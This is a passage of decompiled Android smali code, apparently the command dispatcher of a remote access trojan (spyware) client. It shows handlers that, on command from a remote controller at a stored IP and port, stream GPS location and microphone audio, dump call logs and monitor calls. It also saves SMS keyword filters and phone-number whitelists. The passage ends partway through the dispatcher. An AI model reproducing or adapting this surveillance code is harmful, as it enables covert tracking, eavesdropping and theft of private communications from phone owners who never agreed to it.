.class public Lmy/app/client/ProcessCommand;
.super Ljava/lang/Object;
.source "ProcessCommand.java"


# instance fields
.field arguments:Ljava/nio/ByteBuffer;

.field chan:I

.field client:Lmy/app/client/ClientListener;

.field commande:S

.field editor:Landroid/content/SharedPreferences$Editor;

.field intent:Landroid/content/Intent;

.field settings:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>(Lmy/app/client/ClientListener;)V
    .locals 3
    .param p1, "c"    # Lmy/app/client/ClientListener;

    .prologue
    .line 47
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 49
    iput-object p1, p0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    .line 50
    iget-object v0, p0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v1, "preferences.xml"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Lmy/app/client/ClientListener;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lmy/app/client/ProcessCommand;->settings:Landroid/content/SharedPreferences;

    .line 51
    iget-object v0, p0, Lmy/app/client/ProcessCommand;->settings:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    iput-object v0, p0, Lmy/app/client/ProcessCommand;->editor:Landroid/content/SharedPreferences$Editor;

    .line 52
    return-void
.end method

.method private MessageDecoupator(Ljava/lang/String;)Ljava/util/ArrayList;
    .locals 4
    .param p1, "text"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 316
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 318
    .local v0, "multipleMsg":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    const/4 v1, 0x0

    .line 319
    .local v1, "taille":I
    :goto_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    if-lt v1, v2, :cond_0

    .line 330
    return-object v0

    .line 321
    :cond_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    sub-int v2, v1, v2

    const/16 v3, 0xa7

    if-ge v2, v3, :cond_1

    .line 323
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    invoke-virtual {p1, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 328
    :goto_1
    add-int/lit16 v1, v1, 0xa7

    goto :goto_0

    .line 326
    :cond_1
    add-int/lit16 v2, v1, 0xa7

    invoke-virtual {p1, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_1
.end method

.method private savePreferences([B)V
    .locals 13
    .param p1, "data"    # [B

    .prologue
    .line 266
    new-instance v4, LPacket/PreferencePacket;

    invoke-direct {v4}, LPacket/PreferencePacket;-><init>()V

    .line 267
    .local v4, "pp":LPacket/PreferencePacket;
    invoke-virtual {v4, p1}, LPacket/PreferencePacket;->parse([B)V

    .line 269
    iget-object v10, p0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v11, "preferences"

    const/4 v12, 0x0

    invoke-virtual {v10, v11, v12}, Lmy/app/client/ClientListener;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    .line 271
    .local v5, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 272
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v10, "ip"

    invoke-virtual {v4}, LPacket/PreferencePacket;->getIp()Ljava/lang/String;

    move-result-object v11

    invoke-interface {v0, v10, v11}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 273
    const-string v10, "port"

    invoke-virtual {v4}, LPacket/PreferencePacket;->getPort()I

    move-result v11

    invoke-interface {v0, v10, v11}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 274
    const-string v10, "waitTrigger"

    invoke-virtual {v4}, LPacket/PreferencePacket;->isWaitTrigger()Z

    move-result v11

    invoke-interface {v0, v10, v11}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 276
    const-string v7, ""

    .line 277
    .local v7, "smsKeyWords":Ljava/lang/String;
    const-string v2, ""

    .line 278
    .local v2, "numsCall":Ljava/lang/String;
    const-string v3, ""

    .line 280
    .local v3, "numsSMS":Ljava/lang/String;
    invoke-virtual {v4}, LPacket/PreferencePacket;->getKeywordSMS()Ljava/util/ArrayList;

    move-result-object v6

    .line 281
    .local v6, "smsKeyWord":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_0
    invoke-virtual {v6}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-lt v1, v10, :cond_0

    .line 288
    const-string v10, "smsKeyWords"

    invoke-interface {v0, v10, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 290
    invoke-virtual {v4}, LPacket/PreferencePacket;->getPhoneNumberCall()Ljava/util/ArrayList;

    move-result-object v8

    .line 291
    .local v8, "whiteListCall":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    const/4 v1, 0x0

    :goto_1
    invoke-virtual {v8}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-lt v1, v10, :cond_2

    .line 298
    const-string v10, "numCall"

    invoke-interface {v0, v10, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 301
    invoke-virtual {v4}, LPacket/PreferencePacket;->getPhoneNumberSMS()Ljava/util/ArrayList;

    move-result-object v9

    .line 302
    .local v9, "whiteListSMS":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    const/4 v1, 0x0

    :goto_2
    invoke-virtual {v9}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-lt v1, v10, :cond_4

    .line 309
    const-string v10, "numSMS"

    invoke-interface {v0, v10, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 310
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 312
    return-void

    .line 283
    .end local v8    # "whiteListCall":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v9    # "whiteListSMS":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_0
    invoke-virtual {v6}, Ljava/util/ArrayList;->size()I

    move-result v10

    add-int/lit8 v10, v10, -0x1

    if-ne v1, v10, :cond_1

    .line 284
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 281
    :goto_3
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 286
    :cond_1
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ";"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    goto :goto_3

    .line 293
    .restart local v8    # "whiteListCall":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_2
    invoke-virtual {v8}, Ljava/util/ArrayList;->size()I

    move-result v10

    add-int/lit8 v10, v10, -0x1

    if-ne v1, v10, :cond_3

    .line 294
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 291
    :goto_4
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    .line 296
    :cond_3
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ";"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_4

    .line 304
    .restart local v9    # "whiteListSMS":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_4
    invoke-virtual {v9}, Ljava/util/ArrayList;->size()I

    move-result v10

    add-int/lit8 v10, v10, -0x1

    if-ne v1, v10, :cond_5

    .line 305
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 302
    :goto_5
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_2

    .line 307
    :cond_5
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v11, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, ";"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    goto :goto_5
.end method


# virtual methods
.method public loadPreferences()LPacket/PreferencePacket;
    .locals 12

    .prologue
    const/4 v11, 0x0

    .line 214
    new-instance v3, LPacket/PreferencePacket;

    invoke-direct {v3}, LPacket/PreferencePacket;-><init>()V

    .line 216
    .local v3, "p":LPacket/PreferencePacket;
    iget-object v9, p0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v10, "preferences"

    invoke-virtual {v9, v10, v11}, Lmy/app/client/ClientListener;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    .line 218
    .local v4, "settings":Landroid/content/SharedPreferences;
    const-string v9, "ip"

    const-string v10, "192.168.0.12"

    invoke-interface {v4, v9, v10}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v9}, LPacket/PreferencePacket;->setIp(Ljava/lang/String;)V

    .line 219
    const-string v9, "port"

    const/16 v10, 0x270f

    invoke-interface {v4, v9, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v9

    invoke-virtual {v3, v9}, LPacket/PreferencePacket;->setPort(I)V

    .line 220
    const-string v9, "waitTrigger"

    invoke-interface {v4, v9, v11}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v9

    invoke-virtual {v3, v9}, LPacket/PreferencePacket;->setWaitTrigger(Z)V

    .line 222
    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    .line 223
    .local v5, "smsKeyWords":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    const-string v9, "smsKeyWords"

    const-string v10, ""

    invoke-interface {v4, v9, v10}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 224
    .local v0, "keywords":Ljava/lang/String;
    const-string v9, ""

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_0

    .line 225
    const/4 v5, 0x0

    .line 235
    :goto_0
    new-instance v7, Ljava/util/ArrayList;

    invoke-direct {v7}, Ljava/util/ArrayList;-><init>()V

    .line 236
    .local v7, "whiteListCall":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    const-string v9, "numCall"

    const-string v10, ""

    invoke-interface {v4, v9, v10}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 237
    .local v1, "listCall":Ljava/lang/String;
    const-string v9, ""

    invoke-virtual {v1, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_2

    .line 238
    const/4 v7, 0x0

    .line 249
    :goto_1
    new-instance v8, Ljava/util/ArrayList;

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 250
    .local v8, "whiteListSMS":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    const-string v9, "numSMS"

    const-string v10, ""

    invoke-interface {v4, v9, v10}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 251
    .local v2, "listSMS":Ljava/lang/String;
    const-string v9, ""

    invoke-virtual {v2, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 252
    const/4 v8, 0x0

    .line 261
    :goto_2
    return-object v3

    .line 227
    .end local v1    # "listCall":Ljava/lang/String;
    .end local v2    # "listSMS":Ljava/lang/String;
    .end local v7    # "whiteListCall":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v8    # "whiteListSMS":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_0
    new-instance v6, Ljava/util/StringTokenizer;

    const-string v9, ";"

    invoke-direct {v6, v0, v9}, Ljava/util/StringTokenizer;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 228
    .local v6, "st":Ljava/util/StringTokenizer;
    :goto_3
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->hasMoreTokens()Z

    move-result v9

    if-nez v9, :cond_1

    .line 232
    invoke-virtual {v3, v5}, LPacket/PreferencePacket;->setKeywordSMS(Ljava/util/ArrayList;)V

    goto :goto_0

    .line 230
    :cond_1
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->nextToken()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_3

    .line 240
    .end local v6    # "st":Ljava/util/StringTokenizer;
    .restart local v1    # "listCall":Ljava/lang/String;
    .restart local v7    # "whiteListCall":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_2
    new-instance v6, Ljava/util/StringTokenizer;

    const-string v9, ";"

    invoke-direct {v6, v1, v9}, Ljava/util/StringTokenizer;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 241
    .restart local v6    # "st":Ljava/util/StringTokenizer;
    :goto_4
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->hasMoreTokens()Z

    move-result v9

    if-nez v9, :cond_3

    .line 245
    invoke-virtual {v3, v7}, LPacket/PreferencePacket;->setPhoneNumberCall(Ljava/util/ArrayList;)V

    goto :goto_1

    .line 243
    :cond_3
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->nextToken()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_4

    .line 254
    .end local v6    # "st":Ljava/util/StringTokenizer;
    .restart local v2    # "listSMS":Ljava/lang/String;
    .restart local v8    # "whiteListSMS":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_4
    new-instance v6, Ljava/util/StringTokenizer;

    const-string v9, ";"

    invoke-direct {v6, v2, v9}, Ljava/util/StringTokenizer;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 255
    .restart local v6    # "st":Ljava/util/StringTokenizer;
    :goto_5
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->hasMoreTokens()Z

    move-result v9

    if-nez v9, :cond_5

    .line 259
    invoke-virtual {v3, v8}, LPacket/PreferencePacket;->setPhoneNumberSMS(Ljava/util/ArrayList;)V

    goto :goto_2

    .line 257
    :cond_5
    invoke-virtual {v6}, Ljava/util/StringTokenizer;->nextToken()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_5
.end method

.method public process(S[BI)V
    .locals 21
    .param p1, "cmd"    # S
    .param p2, "args"    # [B
    .param p3, "chan"    # I

    .prologue
    .line 56
    move/from16 v0, p1

    move-object/from16 v1, p0

    iput-short v0, v1, Lmy/app/client/ProcessCommand;->commande:S

    .line 57
    move/from16 v0, p3

    move-object/from16 v1, p0

    iput v0, v1, Lmy/app/client/ProcessCommand;->chan:I

    .line 58
    invoke-static/range {p2 .. p2}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    .line 60
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_GPS_STREAM:S

    if-ne v2, v4, :cond_3

    .line 62
    new-instance v17, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    move-object/from16 v0, v17

    invoke-direct {v0, v2}, Ljava/lang/String;-><init>([B)V

    .line 64
    .local v17, "provider":Ljava/lang/String;
    const-string v2, "network"

    move-object/from16 v0, v17

    invoke-virtual {v0, v2}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_0

    const-string v2, "gps"

    move-object/from16 v0, v17

    invoke-virtual {v0, v2}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_2

    .line 65
    :cond_0
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/GPSListener;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, v17

    move/from16 v1, p3

    invoke-direct {v4, v6, v0, v1}, Lmy/app/Library/GPSListener;-><init>(Landroid/location/LocationListener;Ljava/lang/String;I)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->gps:Lmy/app/Library/GPSListener;

    .line 66
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Location request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 210
    .end local v17    # "provider":Ljava/lang/String;
    :cond_1
    :goto_0
    return-void

    .line 69
    .restart local v17    # "provider":Ljava/lang/String;
    :cond_2
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "Unknown provider \'"

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v17

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, "\' for location"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto :goto_0

    .line 71
    .end local v17    # "provider":Ljava/lang/String;
    :cond_3
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->STOP_GPS_STREAM:S

    if-ne v2, v4, :cond_4

    .line 73
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->gps:Lmy/app/Library/GPSListener;

    invoke-virtual {v2}, Lmy/app/Library/GPSListener;->stop()V

    .line 74
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const/4 v4, 0x0

    iput-object v4, v2, Lmy/app/client/ClientListener;->gps:Lmy/app/Library/GPSListener;

    .line 75
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Location stopped"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    goto :goto_0

    .line 77
    :cond_4
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_SOUND_STREAM:S

    if-ne v2, v4, :cond_5

    .line 79
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Audio streaming request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 80
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/AudioStreamer;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v7, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v7}, Ljava/nio/ByteBuffer;->getInt()I

    move-result v7

    move/from16 v0, p3

    invoke-direct {v4, v6, v7, v0}, Lmy/app/Library/AudioStreamer;-><init>(Landroid/media/AudioRecord$OnRecordPositionUpdateListener;II)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->audioStreamer:Lmy/app/Library/AudioStreamer;

    .line 81
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->audioStreamer:Lmy/app/Library/AudioStreamer;

    invoke-virtual {v2}, Lmy/app/Library/AudioStreamer;->run()V

    goto :goto_0

    .line 83
    :cond_5
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->STOP_SOUND_STREAM:S

    if-ne v2, v4, :cond_6

    .line 85
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->audioStreamer:Lmy/app/Library/AudioStreamer;

    invoke-virtual {v2}, Lmy/app/Library/AudioStreamer;->stop()V

    .line 86
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const/4 v4, 0x0

    iput-object v4, v2, Lmy/app/client/ClientListener;->audioStreamer:Lmy/app/Library/AudioStreamer;

    .line 87
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Audio streaming stopped"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 89
    :cond_6
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_CALL_LOGS:S

    if-ne v2, v4, :cond_7

    .line 91
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Call log request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 92
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v4, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v4}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v4

    move/from16 v0, p3

    invoke-static {v2, v0, v4}, Lmy/app/Library/CallLogLister;->listCallLog(Lmy/app/client/ClientListener;I[B)Z

    move-result v2

    if-nez v2, :cond_1

    .line 93
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "No call logs"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 95
    :cond_7
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->MONITOR_CALL:S

    if-ne v2, v4, :cond_8

    .line 97
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Start monitoring call"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 98
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/CallMonitor;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v7, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v7}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v7

    move/from16 v0, p3

    invoke-direct {v4, v6, v0, v7}, Lmy/app/Library/CallMonitor;-><init>(Lmy/app/client/ClientListener;I[B)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->callMonitor:Lmy/app/Library/CallMonitor;

    goto/16 :goto_0

    .line 100
    :cond_8
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->STOP_MONITOR_CALL:S

    if-ne v2, v4, :cond_9

